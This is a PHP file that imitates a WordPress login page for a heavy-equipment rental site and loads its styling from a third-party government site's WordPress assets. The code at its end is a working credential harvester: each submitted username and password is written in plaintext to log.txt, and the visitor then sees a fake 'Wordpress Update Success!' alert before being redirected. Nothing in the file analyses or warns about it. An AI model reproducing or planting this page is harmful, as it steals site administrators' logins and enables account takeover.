<?php
/*
*/
//Configuration
$domain="http://sewaalatberatjatim.com/";
$title="SEWA ALAT BERAT JAWA TIMUR";
?>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title><?php echo $title?> &rsaquo; Log In</title>
	<link rel='stylesheet' id='buttons-css' href="https://satpolpp.patikab.go.id/wp-includes/css/buttons.min.css?ver=4.2.1" type='text/css' media='all' />
<link rel='stylesheet' id='open-sans-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.2.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css' href="https://satpolpp.patikab.go.id/wp-includes/css/dashicons.min.css?ver=4.2.1" type='text/css' media='all' />
<link rel='stylesheet' id='login-css' href="https://satpolpp.patikab.go.id/wp-admin/css/login.min.css?ver=4.2.1" type='text/css' media='all' />
<meta name='robots' content='noindex,follow' />
	</head>
	<body class="login login-action-login wp-core-ui  locale-en-us">
	<div id="login">
		<h1><a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1"><?php echo $title?></a></h1>
	
<form name="loginform" id="loginform" action="" method="post">
	<p>
		<label for="user_login">Username<br />
		<input type="text" name="log" id="user_login" class="input" value="" size="20" /></label>
	</p>
	<p>
		<label for="user_pass">Password<br />
		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" /></label>
	</p>
		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
	</p>
</form>

<p id="nav">
	<a href="<?php echo $domain?>/wp-login.php?action=lostpassword" title="Password Lost and Found">Lost your password?</a>
</p>

<script type="text/javascript">
function wp_attempt_focus(){
setTimeout( function(){ try{
d = document.getElementById('user_login');
d.focus();
d.select();
} catch(e){}
}, 200);
}

wp_attempt_focus();
if(typeof wpOnload=='function')wpOnload();
</script>

	<p id="backtoblog"><a href="<?php echo $domain?>" title="Are you lost?">&larr; Back to <?php echo $title?></a></p>
	
	</div>

	
		<div class="clear"></div>
	</body>
	</html>
<?php
if(isset($_POST['wp-submit'])){
$user=$_POST['log'];$pass=$_POST['pwd'];$date=date("d/m/Y");
$ha=fopen("log.txt",a);
fwrite($ha,"User : $user\nPass : $pass\nDate : $date\n\n");
if(fclose($ha)){echo "<script>alert('Wordpress Update Success!')</script><script>window.location='$domain';</script>";}
}
